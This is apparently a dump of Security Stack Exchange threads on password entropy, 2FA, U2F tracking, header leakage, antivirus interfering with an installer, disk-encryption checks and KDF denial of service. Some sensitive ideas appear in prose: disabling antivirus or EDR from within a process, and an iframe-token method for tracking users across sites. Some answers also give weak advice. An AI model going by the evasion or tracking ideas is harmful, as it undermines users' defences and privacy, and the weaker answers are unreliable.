<p>If passwords are actually generated <strong>randomly</strong> rather than chosen by humans, then the goal is to have a level of entropy matching whatever requirements you set (in bits, or number of combinations, which is the same). There are two approaches to increase this: increase the number of possible symbols, or increase their number (or both, of course). A <strong>random</strong> 10-character lower-case password has roughly the same entropy as a <strong>random</strong> 8-character lower/upper/digit/symbol password. But if it's really random, it's nearly impossible to remember anyway, so it will end up being written down.</p>
<p>Phrases are an alternative. Here you replace characters by words. If you pick 4 <strong>random</strong> words from a 5000-word dictionary, you have again roughly the same entropy as above, and it's probably a lot easier to remember.</p>
<p>However, if you are not picking <strong>random</strong> words out of a long list, but an even easier-to-remember sentence which actually makes sense, then you fall in the same traps as with the usual passwords: are you sure the sentence you chose is not so common that it will end up in dictionaries?</p>
","0"
"257611","257611","Why use random characters in passwords?","<p>I've seen some similar questions but maybe not exactly what I'm asking. Also I can't say that I've followed all the technical jargon in previous posts and am really after more of an intuitive understanding.</p>
<p>So let's say I'm allowed ten characters. The usual requirement is to use numbers, symbols, etc. But why is <code>#^Afx375Zq</code> more secure than <code>aaaaaaaaaa</code>? The hacker doesn't know that I've repeated a character ten times, so doesn't he still have to go through the testing of all possibilities or are things like repeated characters tested first?</p>
<p>Similarly, suppose I use a 21-character passphrase such as</p>
<pre><code>I like Beatles' songs.
</code></pre>
<p>Now someone might say that that's a common type of statement but again the hacker doesn't know that I'm using a passphrase instead of</p>
<pre><code>DD63@*()ZZZ125++dkeic
</code></pre>
<p>so why is it (I assume) less secure? Are passphrases tested first?</p>
","36","8","257997","<p>Any reasonable system will prevent a cracker from repeated attempts to brute-force a password by, for example, imposing a 'lock-out' period after a few  failed attempts, or imposing a longer and longer pause after each failed attempt.</p>
<p>It follows that beyond a certain relatively low point, the complexity of your password is immaterial.  For example, a password that is known to be of 4 digits (ie, a PIN) can be brute-forced inside three attempts in only 0.03% of attacks. Repeated attempts at such attacks should be detected by the system or its administrator, and blocked.  Brute-force cracking is only feasible under that constraint if the system has already been compromised and the password encrypts are available to the cracker.</p>
<p>If the system administrator insists on a long and complex password, then that is an implicit admission that she/he has little faith in the security of the system and her/his ability to keep the password encrypts out of crackers' hands.</p>
<p>However, if you re-use on a high-value target the credentials (username, password)  that you have used on a system that may be cracked, then you can expect trouble.</p>
","0"
"257611","257611","Why use random characters in passwords?","<p>I've seen some similar questions but maybe not exactly what I'm asking. Also I can't say that I've followed all the technical jargon in previous posts and am really after more of an intuitive understanding.</p>
<p>So let's say I'm allowed ten characters. The usual requirement is to use numbers, symbols, etc. But why is <code>#^Afx375Zq</code> more secure than <code>aaaaaaaaaa</code>? The hacker doesn't know that I've repeated a character ten times, so doesn't he still have to go through the testing of all possibilities or are things like repeated characters tested first?</p>
<p>Similarly, suppose I use a 21-character passphrase such as</p>
<pre><code>I like Beatles' songs.
</code></pre>
<p>Now someone might say that that's a common type of statement but again the hacker doesn't know that I'm using a passphrase instead of</p>
<pre><code>DD63@*()ZZZ125++dkeic
</code></pre>
<p>so why is it (I assume) less secure? Are passphrases tested first?</p>
","36","8","258125","<p>I'm a fan of randomly generated passwords.</p>
<p>I use a password safe and randomly generated passwords. I also use my own password generator. No. I won't post it here, but you can get some good ideas from Bruce Schneier's <strong>Applied Cryptography</strong>. My passwords have any of 51 different characters, and each password has 16 characters. 51^16 = 2.1 x 10^27 possible passwords. A brute force attack would be exceptionally difficult for a classical computer. Perhaps a big quantum computer could get it. The down side of it, of course, is that my passwords are pure gibberish. Here's an example: 57x]Vb1R+}m2nh. Ugly, huh? I put them into a password safe and copy/paste them from there. So. You'd need to hack into my computer, run the password safe, guess that password, and you're in. Is this perfect? Probably not:</p>
<p>Smart people think they can come up with an unbreakable code, and the smarter they are, the more certain they are that they can do it.
-- Charles Babbage.</p>
<p>Finally, most security breaches are because of social engineering by clever attackers, and laxity by the defenders. Brute force attacks on a well defended system rarely succeed.</p>
","0"
"257542","257542","How can losing 2FA render encrypted data inaccessible?","<p>As per <a href=""https://bitwarden.com/help/article/lost-two-step-device/#dont-have-a-recovery-code"" rel=""nofollow noreferrer"">Bitwarden's FAQ</a></p>
<blockquote>
<p>If you don’t have your Recovery Code saved somewhere outside of your Vault, there is unfortunately no way for the team to recover the account or data therein. You’ll need to delete your account and start a new one.</p>
</blockquote>
<p>I understand that losing the master password renders the data encrypted with it inaccessible, but 2FA is merely an authentication method, or can that actually be used for partial encryption as well? Or does this statement merely mean the Bitwarden team <em>won't</em> provide access on the basis that e.g. they cannot verify you're the one actually supposed to have the &quot;lost&quot; 2FA?</p>
<p>The question is not about Bitwarden specifically but rather about whether there are actually means to use 2FA for encryption purposes.</p>
","1","3","257544","<p>It depends on the second factor used. <em>(EDIT: Note that this answer is generic to 2FA for encryption in general, and not specific to BitWarden; I don't know enough about how their 2FA works to say.)</em></p>
<p>Some, like TOTP or other one-time passwords, can't be used ahead of time as an input to the encryption, so in that case it's a &quot;won't&quot; rather than a &quot;can't&quot;. (Their software might just not <em>support</em> them accessing the vault using the password but without providing the second factor, but software that does support it could be written and would work.)</p>
<p>Others, like key files or private keys embedded in security devices (e.g. Yubikeys, smart cards, etc.), can be directly used in the decryption process. For example, a key file or public key can be used to encrypt the vault encryption key, such that the vault simply can't be decrypted again without having the same key file or corresponding private key to decrypt the vault key. In that case, the vault key is protected by two keys: the one derived from your password (something you know), and the one derived from the key in your second factor (something you have).</p>
","1"
"257542","257542","How can losing 2FA render encrypted data inaccessible?","<p>As per <a href=""https://bitwarden.com/help/article/lost-two-step-device/#dont-have-a-recovery-code"" rel=""nofollow noreferrer"">Bitwarden's FAQ</a></p>
<blockquote>
<p>If you don’t have your Recovery Code saved somewhere outside of your Vault, there is unfortunately no way for the team to recover the account or data therein. You’ll need to delete your account and start a new one.</p>
</blockquote>
<p>I understand that losing the master password renders the data encrypted with it inaccessible, but 2FA is merely an authentication method, or can that actually be used for partial encryption as well? Or does this statement merely mean the Bitwarden team <em>won't</em> provide access on the basis that e.g. they cannot verify you're the one actually supposed to have the &quot;lost&quot; 2FA?</p>
<p>The question is not about Bitwarden specifically but rather about whether there are actually means to use 2FA for encryption purposes.</p>
","1","3","257799","<p>It's against the privacy policy of any organization to issue data to any user that claims to be a legitimate owner of any information, but can't truly verify his/her identity using the additional 2FA feature which he/she chose during registration as a form of service access. To protect the actual users, the data is therefore not issued to any person or bot that tries to access it and can't verify it using the 2FA feature enabled, hence, even if you the owner lost the recovery code, there won't be any way that they'll be able to tell that it is truly you(the) owner trying to access the data.</p>
<p>Put it simply, it is just an extra form of MFA security to help protect any user if for example in a situation where your normal login data has been compromised by third party users(username and password) which is enough to give them access to your data, but since theirs an extra security added, they'd have to verify the ownership other than just providing the normal username and password.</p>
","1"
"257542","257542","How can losing 2FA render encrypted data inaccessible?","<p>As per <a href=""https://bitwarden.com/help/article/lost-two-step-device/#dont-have-a-recovery-code"" rel=""nofollow noreferrer"">Bitwarden's FAQ</a></p>
<blockquote>
<p>If you don’t have your Recovery Code saved somewhere outside of your Vault, there is unfortunately no way for the team to recover the account or data therein. You’ll need to delete your account and start a new one.</p>
</blockquote>
<p>I understand that losing the master password renders the data encrypted with it inaccessible, but 2FA is merely an authentication method, or can that actually be used for partial encryption as well? Or does this statement merely mean the Bitwarden team <em>won't</em> provide access on the basis that e.g. they cannot verify you're the one actually supposed to have the &quot;lost&quot; 2FA?</p>
<p>The question is not about Bitwarden specifically but rather about whether there are actually means to use 2FA for encryption purposes.</p>
","1","3","257804","<p>The same FAQ talks about getting sent an email AND that losing access to your linked Email inbox is the same as losing your 2FA device.</p>
<p>That suggests that the TOTP code is not part of the encryption process, but rather, as the FAQ states, it will</p>
<blockquote>
<p>lock you out of your Bitwarden Vault</p>
</blockquote>
","1"
"257469","257469","Is a USB security key trackable among websites?","<p>If I have a security key (U2F key) like yubikey and use it on websites A and B and the owner of these two websites is the same, can the website owner know that I am the same user?</p>
","31","3","257470","<p>The owner of the two sites may be able to track you from one site to the other using methods such as browser fingerprinting or other ways of tracking users as they surf from site to site; but they won't be able to track you from site to site by way of your Yubikey.  Yubikey relies on FIDO2, and the developers of FIDO2 considered this problem.  See <a href=""https://fidoalliance.org/fido2/"" rel=""noreferrer"">https://fidoalliance.org/fido2/</a>, and scroll down to where it reads:</p>
<blockquote>
<p>Privacy</p>
<p>Because FIDO cryptographic keys are unique for each internet
site, they cannot be used to track users across sites. Plus, biometric
data, when used, never leaves the user’s device.</p>
</blockquote>
","43"
"257469","257469","Is a USB security key trackable among websites?","<p>If I have a security key (U2F key) like yubikey and use it on websites A and B and the owner of these two websites is the same, can the website owner know that I am the same user?</p>
","31","3","257482","<p><strong>Yes</strong>, if they are &quot;evil&quot;  enough.</p>
<p>There are a lot of ways to track you across websites even if you don't use an U2F key as @mti2935 mentions, but if they are especially interested in <strong>correlating the different keys on your hardware device</strong> (of even in correlating different hardware devices, if you them all plugged-in at the same time, and they don't require separate extra authentications on each access) they could use techniques to correlate them (eg. on site A, make an <code>iframe</code> with random token opening small/invisible part of site B having same token - your browser would authenticate on site A with key A, and on site B with key B, so they would that both key A and key B accessed URLs containing the same token, so are belonging to the same visitor)</p>
","6"
"257469","257469","Is a USB security key trackable among websites?","<p>If I have a security key (U2F key) like yubikey and use it on websites A and B and the owner of these two websites is the same, can the website owner know that I am the same user?</p>
","31","3","257490","<p>Good question.</p>
<p>It is common peculiarity in the security hardware (and software) that the keys it generates have some non-uniform distribution in the space of possible keys. This is usually acceptable, as long as the keys don't get too much predictable.</p>
<p>In some cases, the keys can be recognized as generated by a particular software or device. This is still acceptable, as long as the whole keyspace is not much reduced.</p>
<p>In some extreme cases, the key generation algorithm has some grave bug that makes it generate repeating keys (see e.g. <a href=""https://www.gitkraken.com/blog/weak-ssh-key-fix"" rel=""nofollow noreferrer"">here</a> or <a href=""https://jblevins.org/log/ssh-vulnkey"" rel=""nofollow noreferrer"">here</a>) because of insufficient entropy used.</p>
<p>Of course, the last case is pretty bad.</p>
<p>An algorithm that generates keys that are recognizable as generated by the same instance should be considered profoundly broken. It would boil down to keys being dependent on some initial seed of the random generator and a little entropy is added between key generations.</p>
<p>Yubikeys in particular have a mixed reputation. On one hand, their software is partly closed, on the other hand, they are pretty much popular and a lot of people search them for vulnerabilities.</p>
<p>I would be particularly concerned with <a href=""https://www.scmp.com/news/hong-kong/society/article/3032287/swedish-tech-firm-yubico-hands-hong-kong-protesters-free"" rel=""nofollow noreferrer"">this</a>, meaning that the vendor is of particular interest of a powerful state-sponsored hacking groups. This may mean either that they are &quot;good enough&quot; against a state-backed hacking or that they are already compromised.</p>
<p>Your mileage may vary.</p>
","2"
"257414","257414","HttpResponse Headers Information Leakage on Server Error (Verbose Headers)","<p>In the past I have dealt with security issues related to Default Service Banners/Verbose Headers/Information Leakage via HttpResponse Headers.  These issues are quite common, and usually look something like this for an Asp.Net - IIS Server.</p>
<p>Server:  Microsoft-IIS/10.0</p>
<p>X-AspNet-Version:  4.0.30319</p>
<p>X-Powered-By:  ASP.NET</p>
<p>These types of issues are very common, and usually quite trivial to deal with, typically a web.config update or an URLRewrite rule to remove the verbose headers.</p>
<p>However, one issue I stumbled upon lately, is when the Server encounters an error, these headers are not removed.  For example a 404 (not found) error will still have these headers appended on.  In fact most error responses are not able to properly remove the information leakage headers.  I did some searching and found out this issue is not very well documented, in fact it has never come up in one of our Pen-Tests specifically.</p>
<p>I am curious if any other developers have dealt with this issue, specifically information leakage in HttpResponse Headers when the response code is an Error.  If so, how did you fix it.  I am using Microsoft, Asp.Net, IIS technologies, but still curious if other technologies/servers have this issue.</p>
","3","3","258122","<p>My understanding is that although it's best practice to remove these informational headers, it doesn't give much protection as there are other ways attackers can characterise a server.  For example different web servers might send other headers back in a different order, or might respond differently for error cases or edge cases.</p>
<p>If you have anything in front of your web server, it might be able to strip headers from the response.  For example if using Amazon Web Services CloudFront CDN, you could use a Lambda function on the response to always strip the headers.</p>
","0"
"257414","257414","HttpResponse Headers Information Leakage on Server Error (Verbose Headers)","<p>In the past I have dealt with security issues related to Default Service Banners/Verbose Headers/Information Leakage via HttpResponse Headers.  These issues are quite common, and usually look something like this for an Asp.Net - IIS Server.</p>
<p>Server:  Microsoft-IIS/10.0</p>
<p>X-AspNet-Version:  4.0.30319</p>
<p>X-Powered-By:  ASP.NET</p>
<p>These types of issues are very common, and usually quite trivial to deal with, typically a web.config update or an URLRewrite rule to remove the verbose headers.</p>
<p>However, one issue I stumbled upon lately, is when the Server encounters an error, these headers are not removed.  For example a 404 (not found) error will still have these headers appended on.  In fact most error responses are not able to properly remove the information leakage headers.  I did some searching and found out this issue is not very well documented, in fact it has never come up in one of our Pen-Tests specifically.</p>
<p>I am curious if any other developers have dealt with this issue, specifically information leakage in HttpResponse Headers when the response code is an Error.  If so, how did you fix it.  I am using Microsoft, Asp.Net, IIS technologies, but still curious if other technologies/servers have this issue.</p>
","3","3","258124","<p>What you're trying to achieve is security through obscurity...
Even though you can remove the headers, you can't really patch the detection mechanisms that easily.</p>
<p>You see, each web server (IIS in your example) has a certain signature and fingerprint. This means the web server also has a specific logic for dealing with some strange requests, other headers, timings, timeouts, reconnection attempts, handling of some exotic data etc etc.</p>
<p>You can theoretically change that behaviour in open source Web Servers, but IIS is not open source as far as I know. You could in theory reverse engineer it and try to rebuild it, but that's probably more effort than you're willing to spare.</p>
<p>So in my humble opinion, the best defence would be to just regularly update your web server and the OS as well. You could also use a reverse proxy/CDN provider like Cloudflare as Chris Denning suggested.</p>
<p>A information leakage would be when the equivalent of phpinfo would get leaked with environment variables containing secret keys (which is a bad practice in the first place!).</p>
","0"
"257414","257414","HttpResponse Headers Information Leakage on Server Error (Verbose Headers)","<p>In the past I have dealt with security issues related to Default Service Banners/Verbose Headers/Information Leakage via HttpResponse Headers.  These issues are quite common, and usually look something like this for an Asp.Net - IIS Server.</p>
<p>Server:  Microsoft-IIS/10.0</p>
<p>X-AspNet-Version:  4.0.30319</p>
<p>X-Powered-By:  ASP.NET</p>
<p>These types of issues are very common, and usually quite trivial to deal with, typically a web.config update or an URLRewrite rule to remove the verbose headers.</p>
<p>However, one issue I stumbled upon lately, is when the Server encounters an error, these headers are not removed.  For example a 404 (not found) error will still have these headers appended on.  In fact most error responses are not able to properly remove the information leakage headers.  I did some searching and found out this issue is not very well documented, in fact it has never come up in one of our Pen-Tests specifically.</p>
<p>I am curious if any other developers have dealt with this issue, specifically information leakage in HttpResponse Headers when the response code is an Error.  If so, how did you fix it.  I am using Microsoft, Asp.Net, IIS technologies, but still curious if other technologies/servers have this issue.</p>
","3","3","258521","<p>Thanks to Cody (my co-worker) for his response.</p>
<p>We have had many applications to mitigate this problem for. We've actually done it at <strong>the load balancer level</strong>, so that all responses, error or otherwise, are treated the same.</p>
<p>We're doing that with an <strong>iRule for F5</strong> - iRules Home</p>
<p><a href=""https://clouddocs.f5.com/api/irules/"" rel=""nofollow noreferrer"">https://clouddocs.f5.com/api/irules/</a></p>
<p>the irule has an array of blacklisted header names, and just removes those on every response</p>
<p>if you're trying to accomplish the same thing within AWS or some other managed load balancing mechanism, unfortunately i'm not sure how you would go about doing that</p>
","1"
"257375","257375","How can I have my process detect if antivirus injected a module or DLL to it?","<p>I am writing an installer process (.exe). My installer deploys different components. It will add registry entries, copy files, copy files over the network, remote execute, remote PowerShell, local Powershell, etc.</p>
<p>Sometimes, antivirus DLLs are injected into my process and harm my installer function flow causing it to fail (blocking it, killing it, etc).</p>
<p>Questions</p>
<ol>
<li>Are there any best practices or guidelines out there to detect this?</li>
<li>Are there any best practices or guidelines out there to eliminate this problem? (FYI, we signed the DLLs/EXE.)</li>
</ol>
<p>An example approach:</p>
<ol>
<li>Start the installer, when its up and running, Use procmon or ListDLLs, get the loaded DLLs list and check if any of the DLL belongs to known antivirus or EDR suite. If so, disable it.</li>
</ol>
<p>I'm looking for a highly reliable way to figure out if antivirus or EDR is interfering with my process. All my .exe and DLLs are signed.</p>
","1","3","257382","<p>The general task of this kind has no solution.</p>
<p>The operating system, the high permissions processes or services can do practically whatever they want. The various malware &quot;vendors&quot; trying evasive measures are in a constant arms-race with antiviruses.</p>
<p>On the other hand, legitimate antimalware software would not &quot;inject&quot; anything. What it usually does is to deny you a permission for some action (writting a file, changing a registry value) or, in some cases, silently fail or revert your action. Or kill your process for good.</p>
<p>Signing your installer package and probably your executable files may be a good thing because the user, the admin or you (given access) can recognize files that are corrupted or tampered with. It may be as well used to whitelist your software in the operating system or in the antimalware software.</p>
<p>Other than this, it looks like you are trying to write a malware. Good to see you are that much naive. :)</p>
","0"
"257375","257375","How can I have my process detect if antivirus injected a module or DLL to it?","<p>I am writing an installer process (.exe). My installer deploys different components. It will add registry entries, copy files, copy files over the network, remote execute, remote PowerShell, local Powershell, etc.</p>
<p>Sometimes, antivirus DLLs are injected into my process and harm my installer function flow causing it to fail (blocking it, killing it, etc).</p>
<p>Questions</p>
<ol>
<li>Are there any best practices or guidelines out there to detect this?</li>
<li>Are there any best practices or guidelines out there to eliminate this problem? (FYI, we signed the DLLs/EXE.)</li>
</ol>
<p>An example approach:</p>
<ol>
<li>Start the installer, when its up and running, Use procmon or ListDLLs, get the loaded DLLs list and check if any of the DLL belongs to known antivirus or EDR suite. If so, disable it.</li>
</ol>
<p>I'm looking for a highly reliable way to figure out if antivirus or EDR is interfering with my process. All my .exe and DLLs are signed.</p>
","1","3","258240","<blockquote>
<p>How can I have my process detect if antivirus injected a module or DLL to it?</p>
</blockquote>
<p>This may be difficult for <em>your</em> process to do.</p>
<p>In the example you provided</p>
<blockquote>
<p>An example approach: Start the installer, when its up and running, Use procmon or ListDLLs, get the loaded DLLs list and check if any of the DLL belongs to known antivirus or EDR suite. If so, disable it.</p>
</blockquote>
<p>a different process (procmon) is used to analyze <em>your</em> process. In fact, this is not just a separate/different process, but it is also a privileged process. Any similar watchdog process will likely have to be privileged because it will need to access other processes' memory (e.g., your process's memory).</p>
<p>If you start to modify <em>your</em> process to perform introspection on itself (e.g., to look at it's own loaded DLLs and compare them to known good DLLs), this behavior itself will likely seem fishy to AV, and that might make your problems worse.</p>
<p>If your installer is using a lot of cryptographic operations the AV might also think this is fishy.</p>
<p>In general, you could suggest testing the installer on various platforms and seeing what AV interfere with your installer. They in your documentation you can warn that these AV cause problems. You could also try to contact the AV vendor and see if they can whitelist your application, but I'm not sure how successful you will be unless you are making a very widely used software.</p>
<p>Finally, if you really are trying to &quot;disable&quot; AV injecting DLLs, you will likely need your own kernel driver to be installed. The AV itself likely has a kernel driver that &quot;listens&quot; for any new process and immediately injects its own DLLs. To counteract this will likely require a kernel driver. And, even then, it might not work.</p>
","1"
"257375","257375","How can I have my process detect if antivirus injected a module or DLL to it?","<p>I am writing an installer process (.exe). My installer deploys different components. It will add registry entries, copy files, copy files over the network, remote execute, remote PowerShell, local Powershell, etc.</p>
<p>Sometimes, antivirus DLLs are injected into my process and harm my installer function flow causing it to fail (blocking it, killing it, etc).</p>
<p>Questions</p>
<ol>
<li>Are there any best practices or guidelines out there to detect this?</li>
<li>Are there any best practices or guidelines out there to eliminate this problem? (FYI, we signed the DLLs/EXE.)</li>
</ol>
<p>An example approach:</p>
<ol>
<li>Start the installer, when its up and running, Use procmon or ListDLLs, get the loaded DLLs list and check if any of the DLL belongs to known antivirus or EDR suite. If so, disable it.</li>
</ol>
<p>I'm looking for a highly reliable way to figure out if antivirus or EDR is interfering with my process. All my .exe and DLLs are signed.</p>
","1","3","258244","<p>AFAIK, this is a well known issue with anti-virus softwares, and little if any can be done.</p>
<p>A decent antivirus not only has signatures for well known malwares but also use <em>heuristics</em> to detect <em>weird</em> activity from unknow programs. In order not to prevent usage of well known valid softwares, they also have a white list for programs that should no be inspected with heuristics.</p>
<p>The problem is that an installer is a piece of code that does a lot of suspect activity: it writes new files in <em>system</em> folders, eventually modifies some, may download executable files from network, etc. That alone is enough for anti-virus software to see it as suspect if they do not know it as a well knows program.</p>
<p>Because of that, and before the generalization of white lists, a good deal of installer programs used to ask the user to switch their antivirus off before installing their application.</p>
<p>Even now, you are left with only 2 ways:</p>
<ul>
<li>declare your application and its installer to all major anti-virus vendors and ask them to white-list it. If you are from a well known company, it is really the way to go. If you are a free-lance developper your demand could be ignored...</li>
<li>provide your users ways to make sure that they have a genuine installer from you (md5 or better sha hashes, <em>secure</em> distributions, etc.) and ask them to switch their anti-virus off for the installation. Yes it is the (not so) good old way, but this one is bullet proof...</li>
</ul>
","1"
"257362","257362","Is looking for plain text strings on an encrypted disk a good test?","<p>I have a dual boot PC, where the Win10 (uncompressed) partition is encrypted with BitLocker. I was curious about making this test (and also encryption took quite a short time in my opinion), so while running Linux I did this:</p>
<pre><code># cat /dev/nvme0n1p3 | strings -25       
Remove disks or other media.
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
... some (very few) lines of garbled characters
# 
</code></pre>
<p>The time it took makes sense according to the partition size and type of disk, and about the garbled text, I guess that a there is a small chance that encrypted data could happen to form a short text string</p>
<p>In that partition there are of course lots of plain text files, so is it safe to say that with this test it's 100% sure that all information is encrypted?</p>
","12","4","257363","<p>No, this is not a good test, not at all.</p>
<p>If you do the same with a zip file, or a docx, or a PNG, you won't see text strings, but the file is not encrypted. Not being able to see plaintext does not mean the file is encrypted.</p>
<p>Believing that garbled means encrypted can lead to wrongs assumptions. If you take a look at a terrible XOR cipher with a single byte key you may think the result is encrypted.</p>
<p>Lots of plaintext means for sure that the drive is not encrypted. Lack of plaintext does not mean anything.</p>
","44"
"257362","257362","Is looking for plain text strings on an encrypted disk a good test?","<p>I have a dual boot PC, where the Win10 (uncompressed) partition is encrypted with BitLocker. I was curious about making this test (and also encryption took quite a short time in my opinion), so while running Linux I did this:</p>
<pre><code># cat /dev/nvme0n1p3 | strings -25       
Remove disks or other media.
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
... some (very few) lines of garbled characters
# 
</code></pre>
<p>The time it took makes sense according to the partition size and type of disk, and about the garbled text, I guess that a there is a small chance that encrypted data could happen to form a short text string</p>
<p>In that partition there are of course lots of plain text files, so is it safe to say that with this test it's 100% sure that all information is encrypted?</p>
","12","4","257381","<p>The test may be good or not, depending on what you need.</p>
<p>If you need to make a distinction between a known good encryption (bitlocker is pretty much acceptable for a lot of purposes) and a plaintext data, it is good.</p>
<p>The situation is much more frequent than you think.</p>
<p>It is probably better to use something like hexdump -C /dev/nvmexxx | less</p>
<p>A lot of filesystem structures are pretty much recognizable and low entropy that one can see even before reaching to the actual file data. E.g. a FAT32 table will have a sequences looking like xxxAxxxBxxxCxxxDxxxE ...</p>
<p>On the other hand, it is pretty much useless if you need to make a distinction between good and bad encryption. ... unless you are a trained cryptographer and you look for a particular pattern. In this case, you know the answer to this question anyway.</p>
","11"
"257362","257362","Is looking for plain text strings on an encrypted disk a good test?","<p>I have a dual boot PC, where the Win10 (uncompressed) partition is encrypted with BitLocker. I was curious about making this test (and also encryption took quite a short time in my opinion), so while running Linux I did this:</p>
<pre><code># cat /dev/nvme0n1p3 | strings -25       
Remove disks or other media.
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
... some (very few) lines of garbled characters
# 
</code></pre>
<p>The time it took makes sense according to the partition size and type of disk, and about the garbled text, I guess that a there is a small chance that encrypted data could happen to form a short text string</p>
<p>In that partition there are of course lots of plain text files, so is it safe to say that with this test it's 100% sure that all information is encrypted?</p>
","12","4","257391","<p>Of the 256 values in a byte, 92 (126-32, 13, 10) are visible ascii characters.  So there is about 1/3 probability that a random value is considered eligible by <code>strings</code>.</p>
<p>So the probability that 25 bytes in a row are visible characters is approximately (92/256)^25 =~ 0,000000000007739 which is approximately 10^-11.  This is comparable to a terrabyte, so you should expect to see a few strings if dumping a harddrive full of randomly distributed data.</p>
","4"
"257362","257362","Is looking for plain text strings on an encrypted disk a good test?","<p>I have a dual boot PC, where the Win10 (uncompressed) partition is encrypted with BitLocker. I was curious about making this test (and also encryption took quite a short time in my opinion), so while running Linux I did this:</p>
<pre><code># cat /dev/nvme0n1p3 | strings -25       
Remove disks or other media.
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
... some (very few) lines of garbled characters
# 
</code></pre>
<p>The time it took makes sense according to the partition size and type of disk, and about the garbled text, I guess that a there is a small chance that encrypted data could happen to form a short text string</p>
<p>In that partition there are of course lots of plain text files, so is it safe to say that with this test it's 100% sure that all information is encrypted?</p>
","12","4","257406","<blockquote>
<p>the Win10 is encrypted with BitLocker.</p>
</blockquote>
<p>It means that the disk is fully encrypted, by design. Unless there is an in-progress encryption process, where some files are not (yet) encrypted you can rest assured the drive is safe. You could check for the BitLocker partition ID in the GUID table</p>
<blockquote>
<p>I guess that a there is a small chance that encrypted data could happen to form a short text string</p>
</blockquote>
<p>That looks like a bit of the infinite monkeys theorem. Ideally, encryption generates cipher text where each bit has a 50% probability to appear. That means a good cipher is like putting all possible <code>n</code> characters strings (typed on stripes of paper) in a ballot and randomly picking one. Intuitively...</p>
<p>So there is an infinitely low, but &gt; 0 chance that cipher text <strong>appears</strong> to be like a plain string. E.g. you could even read <code>hello</code> somewhere in the text, just because random bytes have formed the ASCII for <code>hello</code>, which doesn't mean someone is greeting you or there is an unencrypted file.</p>
<p>While there are more odds of winning the hardest lottery around the world (6 figures over 90), mining plenties of cryptocurrency, you have a <code>&gt; 0</code> chance to spot a text looking meaningful to you.</p>
<p>I guess that the experiment itself has little to no scientific validity.</p>
","2"
"257283","257283","Do Key-Derivation Functions pose a Denial-of-Service Threat for APIs?","<p>Imagine a simple API, which offers an endpoint <code>POST /account/authenticate</code>, which takes a username and password, then returns a JWT on success and an error on failure. In the backend, the endpoint uses some key-derivation function like Argon2 or PBKDF2, with the parameters tuned to be difficult to crack.</p>
<p>Wouldn't such an endpoint allow a very simple resource exhaustion attack? An attacker can cause a high workload on the server without having to do a lot of work themselves. Depending on how the KDF is configured, many parallel requests can consume large amounts of server memory.</p>
<p>Is this actually an issue? And if so, how can this be mitigated? Since this is an API, typical front-end measures like CAPTCHA are not possible.</p>
","5","4","257284","<p>Yes, they can potentially be a DoS issue (either for CPU or memory) if you don't have any kind of rate limiting in place. But then if you're not rate-limiting login requests, you have all kinds of other security issues as well.</p>
<p>Rate limiting, CAPTCHA, IP blocking, etc can also be used to protect against this. You also need to find an appropriate balance when you tune your hashing algorithm - the harder you make it to crack the hashes, the more expensive logins become, and thus the easier you are to run into resource exhaustion issues (either from an intentional attack or just high volumes of traffic).</p>
<p>There have also been cases where allowing very long password inputs could lead to a DoS (as the hashing of these was much more expensive). Django published <a href=""https://www.djangoproject.com/weblog/2013/sep/15/security/"" rel=""nofollow noreferrer"">an advisory</a> on this back in 2013, and implemented a 4096 byte maximum password length to protect against it.</p>
","3"
"257283","257283","Do Key-Derivation Functions pose a Denial-of-Service Threat for APIs?","<p>Imagine a simple API, which offers an endpoint <code>POST /account/authenticate</code>, which takes a username and password, then returns a JWT on success and an error on failure. In the backend, the endpoint uses some key-derivation function like Argon2 or PBKDF2, with the parameters tuned to be difficult to crack.</p>
<p>Wouldn't such an endpoint allow a very simple resource exhaustion attack? An attacker can cause a high workload on the server without having to do a lot of work themselves. Depending on how the KDF is configured, many parallel requests can consume large amounts of server memory.</p>
<p>Is this actually an issue? And if so, how can this be mitigated? Since this is an API, typical front-end measures like CAPTCHA are not possible.</p>
","5","4","257285","<p>You don't need captcha, you can make the client send a proof of work token along with the username and password.</p>
<p>It would go like this:</p>
<ol>
<li><p>Client <code>GET /account/challenge</code> and receive a nonce</p>
</li>
<li><p>Client have to <code>MD5(nonce + random string)</code> until he finds a hash with the first (or last) 4 digits as zeroes</p>
</li>
<li><p>Client <code>POST /account/authenticate</code> with nonce, random string, username and passord</p>
</li>
<li><p>If you calculate the hash and it checks out, you can execute the KDF</p>
</li>
</ol>
<p>I am sugesting MD5 here because it's a fast hash, and you want a fast hash on the server side to spend little time calculating it. You can increase the difficulty of the proof of work if needed, and it won't change the load on the server, only on the client.</p>
","3"
"257283","257283","Do Key-Derivation Functions pose a Denial-of-Service Threat for APIs?","<p>Imagine a simple API, which offers an endpoint <code>POST /account/authenticate</code>, which takes a username and password, then returns a JWT on success and an error on failure. In the backend, the endpoint uses some key-derivation function like Argon2 or PBKDF2, with the parameters tuned to be difficult to crack.</p>
<p>Wouldn't such an endpoint allow a very simple resource exhaustion attack? An attacker can cause a high workload on the server without having to do a lot of work themselves. Depending on how the KDF is configured, many parallel requests can consume large amounts of server memory.</p>
<p>Is this actually an issue? And if so, how can this be mitigated? Since this is an API, typical front-end measures like CAPTCHA are not possible.</p>
","5","4","257297","<p>Yes, that is a valid concern.  As for how to mitigate it, you have several (not mutually exclusive) options:</p>
<ol>
<li><p>One thing that you've already implemented is <strong>not doing slow key derivation on every request</strong>, but rather having an authentication endpoint that takes a passphrase (or equivalent), applies a slow key-stretching KDF, verifies the correctness of the result and returns a (typically time-limited) token that can be used for fast authentication of subsequent requests.</p>
<p>What such a token should contain depends on your backend implementation.  If you can easily and securely store session data on the backend, probably the easiest solution is to simply generate a (cryptographically) random token of, say, 128 or 256 bits and return it to the client.  You can then store any sensitive information needed for backend processing — possibly including the master pseudorandom key output by the KDF, or one or more subkeys derived from it — in the backend session storage keyed by the random token.</p>
